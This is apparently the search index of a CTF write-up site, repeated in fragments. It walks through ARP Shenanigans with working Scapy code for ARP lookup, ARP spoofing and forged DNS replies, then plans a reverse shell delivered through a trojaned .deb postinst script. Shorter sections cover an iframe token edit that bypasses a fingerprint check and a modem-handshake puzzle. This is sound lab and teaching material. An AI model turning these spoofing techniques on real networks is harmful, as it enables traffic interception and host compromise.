99999 arp_response.hwsrc = \"SOMEVALUEHERE\" arp_response.psrc = \"SOMEVALUEHERE\" arp_response.hwdst = \"SOMEVALUEHERE\" arp_response.pdst = \"SOMEVALUEHERE\" response = ether_resp/arp_response sendp(response, iface=\"eth0\") def main(): # We only want arp requests berkeley_packet_filter = \"(arp[6:2] = 1)\" # sniffing for one packet that will be sent to a function, while storing none sniff(filter=berkeley_packet_filter, prn=handle_arp_packets, store=0, count=1) if __name__ == \"__main__\": main()guest@2f062415b43e:~$ guest@2f062415b43e:~$ guest@2f062415b43e:~$ cat scripts/dns_resp.py #!/usr/bin/python3 from scapy.all import * import netifaces as ni import uuid # Our eth0 IP ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr'] # Our Mac Addr macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1]) # destination ip we arp spoofed ipaddr_we_arp_spoofed = \"10.6.1.10\" def handle_dns_request(packet): # Need to change mac addresses, Ip Addresses, and ports below. # We also need eth = Ether(src=\"00:00:00:00:00:00\", dst=\"00:00:00:00:00:00\") # need to replace mac addresses ip = IP(dst=\"0.0.0.0\", src=\"0.0.0.0\") # need to replace IP addresses udp = UDP(dport=99999, sport=99999) # need to replace ports dns = DNS( # MISSING DNS RESPONSE LAYER VALUES ) dns_response = eth / ip / udp / dns sendp(dns_response, iface=\"eth0\") def main(): berkeley_packet_filter = \" and \".join( [ \"udp dst port 53\", # dns \"udp[10] & 0x80 = 0\", # dns request \"dst host {}\".format(ipaddr_we_arp_spoofed), # destination ip we had spoofed (not our real ip) \"ether dst host {}\".format(macaddr) # our macaddress since we spoofed the ip to our mac ] ) # sniff the eth0 int without storing packets in memory and stopping after one dns request sniff(filter=berkeley_packet_filter, prn=handle_dns_request, store=0, iface=\"eth0\", count=1) if __name__ == \"__main__\": main() guest@2f062415b43e:~$ Given the challenges tools, we're probably on the same LAN as the target. Therefore, we can sniff some packets to see what the target is sending and receiving. Step 03 Let's capture some packets to see what's going on. guest@213231b7d960:~$ tshark -n -i eth0 -c 10 Capturing on 'eth0' 1 0.000000000 4c:24:57:ab:ed:84 \u2192 ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35 2 1.039973169 4c:24:57:ab:ed:84 \u2192 ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35 3 2.071938986 4c:24:57:ab:ed:84 \u2192 ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35 4 3.115916416 4c:24:57:ab:ed:84 \u2192 ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35 5 4.147991531 4c:24:57:ab:ed:84 \u2192 ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35 6 5.179945590 4c:24:57:ab:ed:84 \u2192 ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35 7 6.211994280 4c:24:57:ab:ed:84 \u2192 ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35 8 7.243910002 4c:24:57:ab:ed:84 \u2192 ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35 9 8.299962238 4c:24:57:ab:ed:84 \u2192 ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35 10 9.339999466 4c:24:57:ab:ed:84 \u2192 ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35 10 packets captured guest@213231b7d960:~$ Step 04 Let's load the pcaps to see what we can find out about the target. guest@2f062415b43e:~$ python3 Python 3.8.5 (default, Jul 28 2020, 12:59:40) [GCC 9.3.0] on linux Type \"help\", \"copyright\", \"credits\" or \"license\" for more information. >>> from scapy.all import * >>> >>> arp_cap = rdpcap('pcaps/arp.pcap') >>> dns_cap = rdpcap('pcaps/dns.pcap') >>> >>> arp_cap.show() 0000 Ether / ARP who has 10.10.10.1 says 10.10.10.2 / Padding 0001 Ether / ARP is at cc:00:10:dc:00:00 says 10.10.10.1 / Padding >>> >>> dns_cap.show() 0000 Ether / IP / UDP / DNS Qry \"b'www.netbsd.org.'\" 0001 Ether / IP / UDP / DNS Ans \"204.152.190.12\" >>> >>> arp_cap[0][ARP] <ARP hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=who-has hwsrc=cc:01:10:dc:00:00 psrc=10.10.10.2 hwdst=00:00:00:00:00:00 pdst=10.10.10.1 |<Padding load='\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' |>> >>> >>> arp_cap[1][ARP] <ARP hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=is-at hwsrc=cc:00:10:dc:00:00 psrc=10.10.10.1 hwdst=cc:01:10:dc:00:00 pdst=10.10.10.2 |< Padding load='\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' |>> The pcaps don' appear to tell us anything about the target. Therefore, we'll probably need to spoof the ARP to get more info about the target. Step 05 ARP spoofing is a Machine in the Middle (MitM) attack that allows us to be the machine in the middle of two devices on a network: a gateway (e.g. router) and a target. To fool both, we'll use the ARP protocol to associate our MAC address with each of the devices destination MAC address so that they connect to us instead of each other. First, we need to get the target's MAC address. # python3 >>> broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op=1, pdst='10.6.6.35') >>> res = srp(broadcast) Begin emission: Finished sending 1 packets. * Received 1 packets, got 1 answers, remaining 0 packets >>> res[0][0][1].hwsrc '4c:24:57:ab:ed:84' Next we need out Gateway's MAC: # python3 >>> broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op=1, pdst='10.6.6.53') >>> res = srp(broadcast) Begin emission: Finished sending 1 packets. * Received 1 packets, got 1 answers, remaining 0 packets >>> res[0][0][1].hwsrc 'fa:34:41:59:86:52' Step 06 Then, we can use Prasoon Nath's arpspoofer.py , albeit modifying it so that it runs on python3.x . guest@b7fc447d61f1:~/scripts$ python3 arpspoofer.py Enter Target IP:10.6.6.35 Enter Gateway IP:10.6.6.53 Target MAC 4c:24:57:ab:ed:84 Gateway MAC: fa:34:41:59:86:52 Sending spoofed ARP responses Step 07 After running the ARP spoofing script, we are now the MitM and thus can see some DNS requests for something at ftp.osuosl.org Step 08 We can then do some DNS spoofing to see what's going on, and to maybe deliver a payload to the target. Modifying the given dns_resp.py with help from this DNS spoofing guide from Dartmouth University : # dns_resp.py #!/usr/bin/python3 from scapy.all import * import netifaces as ni import uuid # Our eth0 IP ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr'] # Our Mac Addr macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1]) # Gateway IP address (spoofed) gateway_ip = '10.6.6.53' # Target IP address target_ip = '10.6.6.35' # destination ip we arp spoofed ipaddr_we_arp_spoofed = gateway_ip def handle_dns_request(packet): # Need to change mac addresses, Ip Addresses, and ports below. # We also need eth = Ether(src=packet.dst, dst=packet.src) # need to replace mac addresses ip = IP(dst=target_ip, src=gateway_ip) # need to replace IP addresses udp = UDP(dport=packet.sport, sport=packet.dport) # need to replace ports dns = DNS(an=DNSRR(rdata=ipaddr, rrname='ftp.osuosl.org'), ancount=1, id=packet[DNS].id, qd=packet[DNS].qd, qr=1, aa=1) dns_response = eth / ip / udp / dns sendp(dns_response, iface=\"eth0\") def main(): berkeley_packet_filter = \" and \".join( [ \"udp dst port 53\", # dns \"udp[10] & 0x80 = 0\", # dns request \"dst host {}\".format(ipaddr_we_arp_spoofed), # destination ip we had spoofed (not our real ip) \"ether dst host {}\".format(macaddr) # our macaddress since we spoofed the ip to our mac ] ) # sniff the eth0 int without storing packets in memory and stopping after one dns request sniff(filter=berkeley_packet_filter, prn=handle_dns_request, store=0, iface=\"eth0\", count=1) if __name__ == \"__main__\": main() We can assume that the target is trying to access ftp.osuosl.org either via HTTP (curl, wget, etc.) or FTP. Let's try FTP first. guest@0b3c9c30735c:~/scripts$ python3 -m http.server 21 Serving HTTP on 0.0.0.0 port 21 (http://0.0.0.0:21/) ... guest@0b3c9c30735c:~/scripts$ ./dns_resp.py . Sent 1 packets. guest@0b3c9c30735c:~/scripts$ Nothing captured. Let's try HTTP. guest@0b3c9c30735c:~/scripts$ python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... guest@0b3c9c30735c:~/scripts$ ./dns_resp.py . Sent 1 packets. guest@0b3c9c30735c:~/scripts$ We captured a GET request: Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.6.6.35 - - [11/Jan/2021 06:15:32] code 404, message File not found 10.6.6.35 - - [11/Jan/2021 06:15:32] \"GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1\" 404 - ^C Keyboard interrupt received, exiting. guest@0b3c9c30735c:~/scripts$ Therefore, as the MitM, we can deliver on the target's GET request for /pub/jfrost.backdoor/suriv_amd64.deb . We can modify the .deb files to deliver a payload. We just need to figure out what payload to send and to rename the .deb so that the target gets it. Weaponization Step 09 Knowing that the target is trying to download a .deb , they will likely try to install it after download. Therefore, our payload should start a reverse shell once the target tries to install the .deb . According to rigved and Cashew , there should be a \"postinst shell script located in the debian folder in the source\". And it turns out that there are hints for this challenge that I completely missed and that this given guide seems extremely useful. Delivery Exploitation & Installation C2","title":"Objective 09"},{"location":"challenges/09-arp-shenanigans/#challenge-09-arp-shenanigans","text":"","title":"Challenge 09 - ARP Shenanigans"},{"location":"challenges/09-arp-shenanigans/#challenge","text":"Difficulty: 4/5 Go to the NetWars room on the roof and help Alabaster Snowball get access back to a host using ARP. Retrieve the document at /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt. Who recused herself from the vote described on the document?","title":"Challenge"},{"location":"challenges/09-arp-shenanigans/#shell","text":"Jack Frost has hijacked the host at 10.6.6.35 with some custom malware. Help the North Pole by getting command line access back to this host. Read the HELP.md file for information to help you in this endeavor. Note: The terminal lifetime expires after 30 or more minutes so be sure to copy off any essential work you have done as you go. guest@321e48198541:~$","title":"Shell"},{"location":"challenges/09-arp-shenanigans/#solution","text":"Note: changes from hostname are due to exiting and entering terminal","title":"Solution"},{"location":"challenges/09-arp-shenanigans/#recon","text":"","title":"Recon"},{"location":"challenges/09-arp-shenanigans/#step-01","text":"Let's first see what kind of environment we're working with. guest@21925e0c7e13:~$ ll total 40 drwxr-xr-x 1 guest guest 4096 Jan 11 00:03 ./ drwxr-xr-x 1 root root 4096 Nov 30 18:57 ../ -rw-r--r-- 1 guest guest 220 Feb 25 2020 .bash_logout -rw-r--r-- 1 guest guest 3771 Feb 25 2020 .bashrc -rw-r--r-- 1 guest guest 807 Feb 25 2020 .profile -rw-r--r-- 1 guest guest 830 Dec 5 00:00 HELP.md drwxr-xr-x 1 guest guest 4096 Dec 7 21:11 debs/ lrwxrwxrwx 1 guest guest 9 Dec 7 21:11 motd -> /etc/motd drwxr-xr-x 1 guest guest 4096 Dec 1 15:27 pcaps/ drwxr-xr-x 1 guest guest 4096 Dec 7 21:11 scripts/ guest@21925e0c7e13:~$ ifconfig eth0: flags=4419<UP,BROADCAST,RUNNING,PROMISC,MULTICAST> mtu 1500 inet 10.6.0.4 netmask 255.255.0.0 broadcast 10.6.255.255 ether 02:42:0a:06:00:04 txqueuelen 0 (Ethernet) RX packets 34 bytes 1748 (1.7 KB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73<UP,LOOPBACK,RUNNING> mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 loop txqueuelen 1000 (Local Loopback) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 guest@21925e0c7e13:~$ ping 10.6.6.35 PING 10.6.6.35 (10.6.6.35) 56(84) bytes of data. 64 bytes from 10.6.6.35: icmp_seq=1 ttl=64 time=0.169 ms 64 bytes from 10.6.6.35: icmp_seq=2 ttl=64 time=0.097 ms 64 bytes from 10.6.6.35: icmp_seq=3 ttl=64 time=0.091 ms 64 bytes from 10.6.6.35: icmp_seq=4 ttl=64 time=0.094 ms 64 bytes from 10.6.6.35: icmp_seq=5 ttl=64 time=0.111 ms ^C --- 10.6.6.35 ping statistics --- 5 packets transmitted, 5 received, 0% packet loss, time 4076ms rtt min/avg/max/mdev = 0.091/0.112/0.169/0.029 ms guest@21925e0c7e13:~$ cd debs/; ll total 2556 drwxr-xr-x 1 guest guest 4096 Dec 7 21:11 ./ drwxr-xr-x 1 guest guest 4096 Jan 11 00:03 ../ -rw-r--r-- 1 guest guest 94748 Dec 5 00:00 gedit-common_3.36.1-1_all.deb -rw-r--r-- 1 guest guest 14484 Dec 5 00:00 golang-github-huandu-xstrings-dev_1.2.1-1_all.deb -rw-r--r-- 1 guest guest 269332 Dec 5 00:00 nano_4.8-1ubuntu1_amd64.deb -rw-r--r-- 1 guest guest 61504 Dec 5 00:00 netcat-traditional_1.10-41.1ubuntu1_amd64.deb -rw-r--r-- 1 guest guest 1662268 Dec 5 00:00 nmap_7.80+dfsg1-2build1_amd64.deb -rw-r--r-- 1 guest guest 322680 Dec 5 00:00 socat_1.7.3.3-2_amd64.deb -rw-r--r-- 1 guest guest 168956 Dec 5 00:00 unzip_6.0-25ubuntu1_amd64.deb guest@21925e0c7e13:~/debs$ cd ../scripts/; ll total 16 drwxr-xr-x 1 guest guest 4096 Dec 7 21:11 ./ drwxr-xr-x 1 guest guest 4096 Jan 11 00:03 ../ -rwxr-xr-x 1 guest guest 1290 Dec 4 21:34 arp_resp.py* -rwxr-xr-x 1 guest guest 1526 Dec 7 21:10 dns_resp.py* guest@21925e0c7e13:~/scripts$ cd ../pcaps/; ll total 16 drwxr-xr-x 1 guest guest 4096 Dec 1 15:27 ./ drwxr-xr-x 1 guest guest 4096 Jan 11 00:03 ../ -rw-r--r-- 1 guest guest 176 Nov 30 18:23 arp.pcap -rwxr-xr-x 1 guest guest 220 Nov 30 18:23 dns.pcap* guest@21925e0c7e13:~/pcaps$ So it looks like we have a bunch of traditional text editing tools, some utility tools, and some networking tools. We also have couple address resolution/domain name scripts and pcaps. We're also able to send ICMP packets to our target, so we should be able to start scanning it to see what we're dealing with.","title":"Step 01"},{"location":"challenges/09-arp-shenanigans/#step-02","text":"Let's see what tools we can use guest@21925e0c7e13:~$ apt install debs/nmap_7.80+dfsg1-2build1_amd64.deb E: Could not open lock file /var/lib/dpkg/lock-frontend - open (13: Permission denied) E: Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), are you root? guest@21925e0c7e13:~$ find / -name *nmap* 2> /dev/null /home/guest/debs/nmap_7.80+dfsg1-2build1_amd64.deb /usr/local/lib/python3.8/dist-packages/scapy/modules/nmap.py /usr/local/lib/python3.8/dist-packages/scapy/modules/__pycache__/nmap.cpython-38.pyc /proc/sys/vm/min_unmapped_ratio guest@2f062415b43e:~$ which nc /usr/bin/nc guest@2f062415b43e:~$ which python guest@2f062415b43e:~$ which python3 /usr/bin/python3 guest@2f062415b43e:~$ which pip3 /usr/bin/pip3 guest@2f062415b43e:~$ which tcpdump /usr/sbin/tcpdump guest@2f062415b43e:~$ which wireshark guest@2f062415b43e:~$ which tshark /usr/bin/tshark guest@2f062415b43e:~$ cat scripts/arp_resp.py #!/usr/bin/python3 from scapy.all import * import netifaces as ni import uuid # Our eth0 ip ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr'] # Our eth0 mac address macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1]) def handle_arp_packets(packet): # if arp request, then we need to fill this out to send back our mac as the response if ARP in packet and packet[ARP].op == 1: ether_resp = Ether(dst=\"SOMEMACHERE\", type=0x806, src=\"SOMEMACHERE\") arp_response = ARP(pdst=\"SOMEMACHERE\") arp_response.op = 99999 arp_response.plen = 99999 arp_response.hwlen = 99999 arp_response.ptype = 99999 arp_response.hwtype = 99999 arp_response.hwsrc = \"SOMEVALUEHERE\" arp_response.psrc = \"SOMEVALUEHERE\" arp_response.hwdst = \"SOMEVALUEHERE\" arp_response.pdst = \"SOMEVALUEHERE\" response = ether_resp/arp_response sendp(response, iface=\"eth0\") def main(): # We only want arp requests berkeley_packet_filter = \"(arp[6:2] = 1)\" # sniffing for one packet that will be sent to a function, while storing none sniff(filter=berkeley_packet_filter, prn=handle_arp_packets, store=0, count=1) if __name__ == \"__main__\": main()guest@2f062415b43e:~$ guest@2f062415b43e:~$ guest@2f062415b43e:~$ cat scripts/dns_resp.py #!/usr/bin/python3 from scapy.all import * import netifaces as ni import uuid # Our eth0 IP ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr'] # Our Mac Addr macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1]) # destination ip we arp spoofed ipaddr_we_arp_spoofed = \"10.6.1.10\" def handle_dns_request(packet): # Need to change mac addresses, Ip Addresses, and ports below. # We also need eth = Ether(src=\"00:00:00:00:00:00\", dst=\"00:00:00:00:00:00\") # need to replace mac addresses ip = IP(dst=\"0.0.0.0\", src=\"0.0.0.0\") # need to replace IP addresses udp = UDP(dport=99999, sport=99999) # need to replace ports dns = DNS( # MISSING DNS RESPONSE LAYER VALUES ) dns_response = eth / ip / udp / dns sendp(dns_response, iface=\"eth0\") def main(): berkeley_packet_filter = \" and \".join( [ \"udp dst port 53\", # dns \"udp[10] & 0x80 = 0\", # dns request \"dst host {}\".format(ipaddr_we_arp_spoofed), # destination ip we had spoofed (not our real ip) \"ether dst host {}\".format(macaddr) # our macaddress since we spoofed the ip to our mac ] ) # sniff the eth0 int without storing packets in memory and stopping after one dns request sniff(filter=berkeley_packet_filter, prn=handle_dns_request, store=0, iface=\"eth0\", count=1) if __name__ == \"__main__\": main() guest@2f062415b43e:~$ Given the challenges tools, we're probably on the same LAN as the target. Therefore, we can sniff some packets to see what the target is sending and receiving.","title":"Step 02"},{"location":"challenges/09-arp-shenanigans/#step-03","text":"Let's capture some packets to see what's going on. guest@213231b7d960:~$ tshark -n -i eth0 -c 10 Capturing on 'eth0' 1 0.000000000 4c:24:57:ab:ed:84 \u2192 ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35 2 1.039973169 4c:24:57:ab:ed:84 \u2192 ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35 3 2.071938986 4c:24:57:ab:ed:84 \u2192 ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35 4 3.115916416 4c:24:57:ab:ed:84 \u2192 ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35 5 4.147991531 4c:24:57:ab:ed:84 \u2192 ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35 6 5.179945590 4c:24:57:ab:ed:84 \u2192 ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35 7 6.211994280 4c:24:57:ab:ed:84 \u2192 ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35 8 7.243910002 4c:24:57:ab:ed:84 \u2192 ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35 9 8.299962238 4c:24:57:ab:ed:84 \u2192 ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35 10 9.339999466 4c:24:57:ab:ed:84 \u2192 ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35 10 packets captured guest@213231b7d960:~$","title":"Step 03"},{"location":"challenges/09-arp-shenanigans/#step-04","text":"Let's load the pcaps to see what we can find out about the target. guest@2f062415b43e:~$ python3 Python 3.8.5 (default, Jul 28 2020, 12:59:40) [GCC 9.3.0] on linux Type \"help\", \"copyright\", \"credits\" or \"license\" for more information. >>> from scapy.all import * >>> >>> arp_cap = rdpcap('pcaps/arp.pcap') >>> dns_cap = rdpcap('pcaps/dns.pcap') >>> >>> arp_cap.show() 0000 Ether / ARP who has 10.10.10.1 says 10.10.10.2 / Padding 0001 Ether / ARP is at cc:00:10:dc:00:00 says 10.10.10.1 / Padding >>> >>> dns_cap.show() 0000 Ether / IP / UDP / DNS Qry \"b'www.netbsd.org.'\" 0001 Ether / IP / UDP / DNS Ans \"204.152.190.12\" >>> >>> arp_cap[0][ARP] <ARP hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=who-has hwsrc=cc:01:10:dc:00:00 psrc=10.10.10.2 hwdst=00:00:00:00:00:00 pdst=10.10.10.1 |<Padding load='\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' |>> >>> >>> arp_cap[1][ARP] <ARP hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=is-at hwsrc=cc:00:10:dc:00:00 psrc=10.10.10.1 hwdst=cc:01:10:dc:00:00 pdst=10.10.10.2 |< Padding load='\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' |>> The pcaps don' appear to tell us anything about the target. Therefore, we'll probably need to spoof the ARP to get more info about the target.","title":"Step 04"},{"location":"challenges/09-arp-shenanigans/#step-05","text":"ARP spoofing is a Machine in the Middle (MitM) attack that allows us to be the machine in the middle of two devices on a network: a gateway (e.g. router) and a target. To fool both, we'll use the ARP protocol to associate our MAC address with each of the devices destination MAC address so that they connect to us instead of each other. First, we need to get the target's MAC address. # python3 >>> broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op=1, pdst='10.6.6.35') >>> res = srp(broadcast) Begin emission: Finished sending 1 packets. * Received 1 packets, got 1 answers, remaining 0 packets >>> res[0][0][1].hwsrc '4c:24:57:ab:ed:84' Next we need out Gateway's MAC: # python3 >>> broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op=1, pdst='10.6.6.53') >>> res = srp(broadcast) Begin emission: Finished sending 1 packets. * Received 1 packets, got 1 answers, remaining 0 packets >>> res[0][0][1].hwsrc 'fa:34:41:59:86:52'","title":"Step 05"},{"location":"challenges/09-arp-shenanigans/#step-06","text":"Then, we can use Prasoon Nath's arpspoofer.py , albeit modifying it so that it runs on python3.x . guest@b7fc447d61f1:~/scripts$ python3 arpspoofer.py Enter Target IP:10.6.6.35 Enter Gateway IP:10.6.6.53 Target MAC 4c:24:57:ab:ed:84 Gateway MAC: fa:34:41:59:86:52 Sending spoofed ARP responses","title":"Step 06"},{"location":"challenges/09-arp-shenanigans/#step-07","text":"After running the ARP spoofing script, we are now the MitM and thus can see some DNS requests for something at ftp.osuosl.org","title":"Step 07"},{"location":"challenges/09-arp-shenanigans/#step-08","text":"We can then do some DNS spoofing to see what's going on, and to maybe deliver a payload to the target. Modifying the given dns_resp.py with help from this DNS spoofing guide from Dartmouth University : # dns_resp.py #!/usr/bin/python3 from scapy.all import * import netifaces as ni import uuid # Our eth0 IP ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr'] # Our Mac Addr macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1]) # Gateway IP address (spoofed) gateway_ip = '10.6.6.53' # Target IP address target_ip = '10.6.6.35' # destination ip we arp spoofed ipaddr_we_arp_spoofed = gateway_ip def handle_dns_request(packet): # Need to change mac addresses, Ip Addresses, and ports below. # We also need eth = Ether(src=packet.dst, dst=packet.src) # need to replace mac addresses ip = IP(dst=target_ip, src=gateway_ip) # need to replace IP addresses udp = UDP(dport=packet.sport, sport=packet.dport) # need to replace ports dns = DNS(an=DNSRR(rdata=ipaddr, rrname='ftp.osuosl.org'), ancount=1, id=packet[DNS].id, qd=packet[DNS].qd, qr=1, aa=1) dns_response = eth / ip / udp / dns sendp(dns_response, iface=\"eth0\") def main(): berkeley_packet_filter = \" and \".join( [ \"udp dst port 53\", # dns \"udp[10] & 0x80 = 0\", # dns request \"dst host {}\".format(ipaddr_we_arp_spoofed), # destination ip we had spoofed (not our real ip) \"ether dst host {}\".format(macaddr) # our macaddress since we spoofed the ip to our mac ] ) # sniff the eth0 int without storing packets in memory and stopping after one dns request sniff(filter=berkeley_packet_filter, prn=handle_dns_request, store=0, iface=\"eth0\", count=1) if __name__ == \"__main__\": main() We can assume that the target is trying to access ftp.osuosl.org either via HTTP (curl, wget, etc.) or FTP. Let's try FTP first. guest@0b3c9c30735c:~/scripts$ python3 -m http.server 21 Serving HTTP on 0.0.0.0 port 21 (http://0.0.0.0:21/) ... guest@0b3c9c30735c:~/scripts$ ./dns_resp.py . Sent 1 packets. guest@0b3c9c30735c:~/scripts$ Nothing captured. Let's try HTTP. guest@0b3c9c30735c:~/scripts$ python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... guest@0b3c9c30735c:~/scripts$ ./dns_resp.py . Sent 1 packets. guest@0b3c9c30735c:~/scripts$ We captured a GET request: Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.6.6.35 - - [11/Jan/2021 06:15:32] code 404, message File not found 10.6.6.35 - - [11/Jan/2021 06:15:32] \"GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1\" 404 - ^C Keyboard interrupt received, exiting. guest@0b3c9c30735c:~/scripts$ Therefore, as the MitM, we can deliver on the target's GET request for /pub/jfrost.backdoor/suriv_amd64.deb . We can modify the .deb files to deliver a payload. We just need to figure out what payload to send and to rename the .deb so that the target gets it.","title":"Step 08"},{"location":"challenges/09-arp-shenanigans/#weaponization","text":"","title":"Weaponization"},{"location":"challenges/09-arp-shenanigans/#step-09","text":"Knowing that the target is trying to download a .deb , they will likely try to install it after download. Therefore, our payload should start a reverse shell once the target tries to install the .deb . According to rigved and Cashew , there should be a \"postinst shell script located in the debian folder in the source\". And it turns out that there are hints for this challenge that I completely missed and that this given guide seems extremely useful.","title":"Step 09"},{"location":"challenges/09-arp-shenanigans/#delivery","text":"","title":"Delivery"},{"location":"challenges/09-arp-shenanigans/#exploitation-installation","text":"","title":"Exploitation &amp; Installation"},{"location":"challenges/09-arp-shenanigans/#c2","text":"","title":"C2"},{"location":"challenges/10-defeat-fingerprint-sensor/","text":"Challenge 10 - Defeat Fingerprint Sensor Challenge Difficulty: 3/5 Bypass the Santavator fingerprint sensor. Enter Santa's office without Santa's fingerprint. Solution Step 01 Start by watching the requests/responses associated with Santa using the fingerprint scanner. We can see that the browser sends a POST request to a / via a referer containing a list of tokens. Step 02 Looking through the elevator's iframe, we can see that two things are required to call a function that allows us to continue to the 3rd floor: (1) btn4 needs to contain powered and (2) the interface hastoken('besanta') Step 03 Seeing how our btn4 is already powered, and knowing that one of the tokens from the referer URI is besanta , we can edit the iframe source to have the besanta token.","title":"Objective 10"},{"location":"challenges/10-defeat-fingerprint-sensor/#challenge-10-defeat-fingerprint-sensor","text":"","title":"Challenge 10 - Defeat Fingerprint Sensor"},{"location":"challenges/10-defeat-fingerprint-sensor/#challenge","text":"Difficulty: 3/5 Bypass the Santavator fingerprint sensor. Enter Santa's office without Santa's fingerprint.","title":"Challenge"},{"location":"challenges/10-defeat-fingerprint-sensor/#solution","text":"","title":"Solution"},{"location":"challenges/10-defeat-fingerprint-sensor/#step-01","text":"Start by watching the requests/responses associated with Santa using the fingerprint scanner. We can see that the browser sends a POST request to a / via a referer containing a list of tokens.","title":"Step 01"},{"location":"challenges/10-defeat-fingerprint-sensor/#step-02","text":"Looking through the elevator's iframe, we can see that two things are required to call a function that allows us to continue to the 3rd floor: (1) btn4 needs to contain powered and (2) the interface hastoken('besanta')","title":"Step 02"},{"location":"challenges/10-defeat-fingerprint-sensor/#step-03","text":"Seeing how our btn4 is already powered, and knowing that one of the tokens from the referer URI is besanta , we can edit the iframe source to have the besanta token.","title":"Step 03"},{"location":"challenges/terminal-challenges/33.6kbps/","text":"33.6kbps Challenge Complete the 33.6kbps modem handshake Solution Courtesy of this handy explanation of the dial-up modem handshake by Oona R\u00e4is\u00e4nen: Enter phone number: 756-8347 [Wait for response to finish] baa DEE brrr [Wait for response to finish] aaah [Wait for response to start] WEWEWwrwrrwrr [Wait for response to start] BeDURRdunditty 10.[Wait for response to start] SCHHRRHHRTHRTR","title":"Terminal/33.6kbps"},{"location":"challenges/terminal-challenges/33.6kbps/#336kbps","text":"","title":"33.6kbps"},{"location":"challenges/terminal-challenges/33.6kbps/#challenge","text":"Complete the 33.6kbps modem handshake","title":"Challenge"},{"location":"challenges/terminal-challenges/33.6kbps/#solution","text":"Courtesy of this handy explanation of the dial-up modem handshake by Oona R\u00e4is\u00e4nen: Enter phone number: 756-8347 [Wait for response to finish] baa DEE brrr [Wait for response to finish] aaah [Wait for response to start] WEWEWwrwrrwrr [Wait for response to start] BeDURRdunditty 10.[Wait for response to start] SCHHRRHHRTHRTR","title":"Solution"},{"location":"challenges/terminal-challenges/can-bus-investigation/","text":"CAN Bus Investigation Shell MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM 